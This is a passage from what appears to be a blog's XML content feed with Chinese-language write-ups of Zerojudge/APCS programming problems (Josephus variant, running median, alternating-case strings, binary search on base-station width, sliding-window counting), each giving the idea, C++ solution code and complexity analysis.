end=<span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(end)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> h+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>,tmp ; j&lt;t ; j++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;tmp;</span><br><span class="line">			Next[i].push_back(tmp);</span><br><span class="line">			Next[tmp].push_back(i);</span><br><span class="line">			par[tmp] = <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> root=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(!par[i])&#123;</span><br><span class="line">			root=i;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;root&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	ans += dfs(root,<span class="number">-1</span>);</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>找根的時間複雜度為 $O(n)$<br>DFS會遍歷每個點，且每個點便利的時間複雜度為 $O(1)$，DFS時間複雜度為 $O(n)$<br>總時間複雜度 $O(n)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>recursive</tag>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge c296</title>
    <url>/2020/06/29/Zerojudge%20c296/</url>
    <content><![CDATA[<h1 id="Zerojudge-c296"><a href="#Zerojudge-c296" class="headerlink" title="Zerojudge c296"></a>Zerojudge c296</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=c296" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=c296</a><br>有 $N$ 個人圍成一圈，編號 $1$ ~ $N$，從編號 $1$ 開始每 $m$ 回合後從開頭數過來第 $m$ 個人會被淘汰，下一回合從被淘汰的下一個人開始<br>問經過 $k$ 回合後最後被淘汰的下一個人標號為多少</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><h3 id="暴力-45"><a href="#暴力-45" class="headerlink" title="暴力(45%)"></a>暴力(45%)</h3><p>一開始最好想到的就是跟著模擬一遍，大概會是長這樣子<br>利用編號必定會是遞增的特性，搭配sort可以使每次只需花費 $O(nlogn)$ 的時間</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,k;</span><br><span class="line"><span class="built_in">vector</span>&lt;pii&gt; v;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m&gt;&gt;k;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++) v.emplace_back(i,i);</span><br><span class="line">	<span class="keyword">int</span> last=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(k--)&#123;</span><br><span class="line">		last=(last+m<span class="number">-1</span>)%n;</span><br><span class="line">		n--;</span><br><span class="line">		v[last].first=INT_MAX;</span><br><span class="line">		sort(v.begin(),v.end());</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;v[(last)%n].second&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="觀察規律"><a href="#觀察規律" class="headerlink" title="觀察規律"></a>觀察規律</h3><p>觀察原序號與新序號的關係(假設都從0開始)<br>例如: 當現在 $n=5, m=2, k=4$</p>
<ul>
<li>第一輪<br>  $1$ 號被淘汰</li>
</ul>
<table>
<thead>
<tr>
<th align="center">上一輪編號</th>
<th align="center">0</th>
<th align="center">1</th>
<th align="center">2</th>
<th align="center">3</th>
<th align="center">4</th>
</tr>
</thead>
<tbody><tr>
<td align="center">新編號</td>
<td align="center">3</td>
<td align="center">-</td>
<td align="center">0</td>
<td align="center">1</td>
<td align="center">2</td>
</tr>
</tbody></table>
<ul>
<li>第二輪<br>  $2$ 號被淘汰(上一輪編號)</li>
</ul>
<table>
<thead>
<tr>
<th align="center">上一輪編號</th>
<th align="center">3</th>
<th align="center">-</th>
<th align="center">0</th>
<th align="center">1</th>
<th align="center">2</th>
</tr>
</thead>
<tbody><tr>
<td align="center">新編號</td>
<td align="center">1</td>
<td align="center">-</td>
<td align="center">2</td>
<td align="center">-</td>
<td align="center">0</td>
</tr>
</tbody></table>
<ul>
<li>第三輪<br>  $0$ 號被淘汰(上一輪編號)</li>
</ul>
<table>
<thead>
<tr>
<th align="center">上一輪編號</th>
<th align="center">1</th>
<th align="center">-</th>
<th align="center">2</th>
<th align="center">-</th>
<th align="center">0</th>
</tr>
</thead>
<tbody><tr>
<td align="center">新編號</td>
<td align="center">-</td>
<td align="center">-</td>
<td align="center">0</td>
<td align="center">-</td>
<td align="center">1</td>
</tr>
</tbody></table>
<ul>
<li>第四輪<br>  $1$ 號被淘汰(上一輪編號)</li>
</ul>
<table>
<thead>
<tr>
<th align="center">上一輪編號</th>
<th align="center">-</th>
<th align="center">-</th>
<th align="center">0</th>
<th align="center">-</th>
<th align="center">1</th>
</tr>
</thead>
<tbody><tr>
<td align="center">新編號</td>
<td align="center">-</td>
<td align="center">-</td>
<td align="center">0</td>
<td align="center">-</td>
<td align="center">-</td>
</tr>
</tbody></table>
<p>觀察編號之間的關係，可以發現到因為循環的關係，<code>舊編號 = (新編號+m)%舊人數</code><br>因此，只要解決第 $k$ 輪的問題，第 $k-1$ 輪的答案也就出來了，再來遞迴求解即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,k;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> people, <span class="keyword">int</span> last)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(last==<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">int</span> res=m%people;</span><br><span class="line">		<span class="keyword">return</span> res;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(last==n)&#123;</span><br><span class="line">		<span class="keyword">int</span> res=(solve(people<span class="number">-1</span>, last<span class="number">-1</span>)+m+<span class="number">1</span>)%people;</span><br><span class="line">		<span class="keyword">return</span> res;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">int</span> res=(solve(people<span class="number">-1</span>, last<span class="number">-1</span>)+m)%people;</span><br><span class="line">		<span class="keyword">return</span> res;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m&gt;&gt;k;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;solve(n,k)+<span class="number">1</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>遞迴總共有 $k$ 層，每層的時間複雜度為 $O(1)$<br>總時間複雜度為 $O(k)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>recursive</tag>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge d713</title>
    <url>/2020/09/11/Zerojudge%20d713/</url>
    <content><![CDATA[<h1 id="Zerojudge-d713"><a href="#Zerojudge-d713" class="headerlink" title="Zerojudge d713"></a>Zerojudge d713</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=d713" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=d713</a><br>輸入多個數字，在輸入的同時輸出當前的序列中位數為多少(整數)</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>觀察中位數在序列中的性質<br>可以發現到，<strong>中位數必定會存在於序列的中間</strong><br>如果我們要動態找序列的中位數，可以利用這個性質</p>
<p>無論何時，我們關注的都是序列中的<strong>最中間兩個或是最中間一個數值</strong><br>只要我們知道這個數值，就可以輕鬆求得中位數</p>
<p>利用兩個priorty queue分別記錄<strong>小於當前中位數的序列</strong>以及<strong>剩餘元素</strong><br>且小於中位數的序列我們設定優先取得最大值，另一個優先取得最小值<br>那麼每次我們只要判斷當前元素要被放入哪個序列中，而中位數必定會在頂端</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line">priority_queue&lt;ll,<span class="built_in">vector</span>&lt;ll&gt;,greater&lt;ll&gt;&gt; Mh;</span><br><span class="line">priority_queue&lt;ll&gt; mh;</span><br><span class="line">ll n;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">		<span class="keyword">if</span>(mh.empty() || mh.top()&gt;n)&#123;</span><br><span class="line">			mh.emplace(n);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			Mh.emplace(n);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(mh.size() &gt; Mh.size()+<span class="number">1</span>)&#123;</span><br><span class="line">			Mh.emplace(mh.top());</span><br><span class="line">			mh.pop();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(Mh.size() &gt; mh.size()+<span class="number">1</span>)&#123;</span><br><span class="line">			mh.emplace(Mh.top());</span><br><span class="line">			Mh.pop();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(mh.size() == Mh.size())&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;(mh.top()+Mh.top())/<span class="number">2</span>&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(mh.size() &gt; Mh.size())&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;mh.top()&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;Mh.top()&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>每次加入元素至多對priority queue做3次操作，複雜度為 $O(3nlogn)$</p>
<p>並且每次會做一次運算為$O(1)$</p>
<p>總複雜度約為$O(n^2logn)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
      </categories>
      <tags>
        <tag>資料結構</tag>
        <tag>Zerojudge</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge c462</title>
    <url>/2020/06/28/Zerojudge%20c462/</url>
    <content><![CDATA[<h1 id="Zerojudge-c462"><a href="#Zerojudge-c462" class="headerlink" title="Zerojudge c462"></a>Zerojudge c462</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=c462" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=c462</a><br>定義長度為 $k$ 的大寫字串與長度為 $k$ 的小寫字串串接而成的字串稱為 <code>k-交錯字串</code><br>給一個字串與 $k$ ，求最長的 <code>k-交錯字串</code> 長度</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>用一個陣列去記錄長度，分成幾種狀況討論</p>
<ol>
<li>$s[i]$ 和 $s[i-1]$ 同為大寫或小寫<ol>
<li>本輪循環長度已經超過 $k$<br> 表示循環已經被破壞，並從長度 $k$ 開始重新運算</li>
<li>本輪循環長度小於 $k$<br> 循環長度為上一層+1</li>
</ol>
</li>
<li>$s[i]$ 和 $s[i-1]$ 不同為大寫或小寫<ol>
<li>上一個循環長度為 $k$ 的倍數<br> 表示上一個有完成 $k$ 個循環，可以繼續增長循環</li>
<li>上一個循環長度不為 $k$ 的倍數<br> 表示上一個沒有完成 $k$ 個循環，不能繼續增長循環，從1開始計算</li>
</ol>
</li>
</ol>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,arr[<span class="number">1000000</span>];</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_lower</span><span class="params">(<span class="keyword">char</span> c)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (c&gt;=<span class="string">'a'</span> &amp;&amp; c&lt;=<span class="string">'z'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_higher</span><span class="params">(<span class="keyword">char</span> c)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (c&gt;=<span class="string">'A'</span> &amp;&amp; c&lt;=<span class="string">'Z'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">same</span><span class="params">(<span class="keyword">char</span> a,<span class="keyword">char</span> b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (is_lower(a) &amp;&amp; is_lower(b)) || (is_higher(a) &amp;&amp; is_higher(b));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">		<span class="keyword">int</span> lower=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> higher=<span class="number">0</span>;</span><br><span class="line">		arr[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">int</span> times=<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(!same(s[i],s[i<span class="number">-1</span>]))&#123;</span><br><span class="line">				<span class="keyword">if</span>(arr[i<span class="number">-1</span>]%n!=<span class="number">0</span>)&#123;</span><br><span class="line">					arr[i]=<span class="number">1</span>;</span><br><span class="line">					times=<span class="number">1</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					arr[i]=arr[i<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">					times++;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">if</span>(arr[i<span class="number">-1</span>] &gt;= n*times)&#123;</span><br><span class="line">					arr[i]=n;</span><br><span class="line">					times=<span class="number">1</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					arr[i]=arr[i<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(arr[i]%n==<span class="number">0</span>)</span><br><span class="line">				ans=max(ans,arr[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>$O(len(s))$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge c575</title>
    <url>/2020/06/29/Zerojudge%20c575/</url>
    <content><![CDATA[<h1 id="Zerojudge-c575"><a href="#Zerojudge-c575" class="headerlink" title="Zerojudge c575"></a>Zerojudge c575</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=c575" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=c575</a><br>一個一維座標上有 $n$ 個點 $p$，在座標上最多放置 $k$ 個基地台<br>每個基地台可以隨意放在座標點上任一點(不限於整數座標)，若點包含於某基地台的半徑 $r$ 內則可接收到訊號<br>求基地台的最小直徑，使得所有標記的點都能接收到訊號</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>點可以說幾乎無限多個，顯然暴力去找基地台可以放在哪裡是不合理的<br>但是我們知道基地台可以隨便放，也知道需要包含在那些座標點上<br>我們可以先將所有座標點由小到大排序<br>很快可以知道基地台最大直徑為$p_n-p_1$，最小為1(一個點座標長度)<br>二分搜基地台的直徑 $R$ ，每次檢查 $R$ 是否符合</p>
<p>至於要如何檢查呢?<br>我們可以從 $p_1$ 開始，每次加上本次枚舉的直徑，將包含在直徑內的點都移除，並每次紀錄使用基地台數量<br>當基地台數量超過 $k$ 就不符合</p>
<h3 id="補充"><a href="#補充" class="headerlink" title="補充"></a>補充</h3><p>其實可以發現，基地台直徑最大為 $(p_n-p_1)/k$</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> n,k,base[<span class="number">50005</span>];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ok</span><span class="params">(<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> numbers=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,now=base[<span class="number">0</span>]+len ; i&lt;n &amp;&amp; numbers&lt;=k+<span class="number">1</span> ; )&#123;</span><br><span class="line">		now=base[i]+len;</span><br><span class="line">		numbers++;</span><br><span class="line">		<span class="keyword">while</span>(i&lt;n &amp;&amp; base[i]&lt;=now)</span><br><span class="line">			i++;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(numbers&lt;=k)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;k;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;base[i];</span><br><span class="line">	&#125;</span><br><span class="line">	sort(base,base+n);</span><br><span class="line">	<span class="keyword">int</span> low=<span class="number">1</span>,high=(base[n<span class="number">-1</span>]-base[<span class="number">0</span>])/k+<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span>(low&lt;high)&#123;</span><br><span class="line">		<span class="keyword">int</span> mid=(low+high)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span>(ok(mid))</span><br><span class="line">			high=mid;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			low=mid+<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;low&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>二分搜時間複雜度為 $O(log(high-low))$<br>本題 $high-low$ 最大不超過 $10^6$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
        <tag>Binary Search</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge e289</title>
    <url>/2020/06/29/Zerojudge%20e289/</url>
    <content><![CDATA[<h1 id="Zerojudge-e289"><a href="#Zerojudge-e289" class="headerlink" title="Zerojudge e289"></a>Zerojudge e289</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=e289" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=e289</a><br>定義一個字串是美麗的為長度 $m$ 且有 $m$ 種不同顏色存在<br>給一個字串及長度 $m$ ，求美麗的字串個數</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>題目中的輸入可到 $10^{150}$，所以選擇用字串儲存<br>可以先將字串 $0$ ~ $m-1$先塞入map，則後面每次只需</p>
<ol>
<li>將 $s[i]$ 塞入map</li>
<li>檢查size是否為 $m$，若是就將答案加1</li>
<li>將頭去掉</li>
</ol>
<h3 id="補充"><a href="#補充" class="headerlink" title="補充"></a>補充</h3><p>其實也不一定需要用到map<br>我們需要實現的只有能快速搜尋<br>可以先排序($O(logn)$)再二分搜($O(logn)$)<br>也可以達到map相同的效果</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> m,n,ans=<span class="number">0</span>,cnt=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">string</span> tmp[<span class="number">200005</span>];</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt; mp;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	mp.clear();</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;m&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,head=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;tmp[i];</span><br><span class="line">		<span class="keyword">if</span>(i&lt;m<span class="number">-1</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(mp.count(tmp[i])) mp[tmp[i]]++;</span><br><span class="line">			<span class="keyword">else</span> mp[tmp[i]]=<span class="number">1</span>,cnt++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(mp[tmp[i]]) mp[tmp[i]]++;</span><br><span class="line">			<span class="keyword">else</span> mp[tmp[i]]=<span class="number">1</span>,cnt++;</span><br><span class="line">			<span class="keyword">if</span>(cnt == m) ans++;</span><br><span class="line">			<span class="keyword">if</span>(mp[tmp[head]]<span class="number">-1</span>) mp[tmp[head]]--;</span><br><span class="line">			<span class="keyword">else</span> mp.erase(tmp[head]),cnt--;</span><br><span class="line">			head++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>輸入時間複雜度為 $O(n)$<br>查詢時間複雜度約為 $O(logm)$<br>總時間複雜度 $O(n+logm)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
        <tag>Binary Search</tag>
        <tag>sort</tag>
        <tag>Map</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge e287</title>
    <url>/2020/06/28/Zerojudge%20e287/</url>
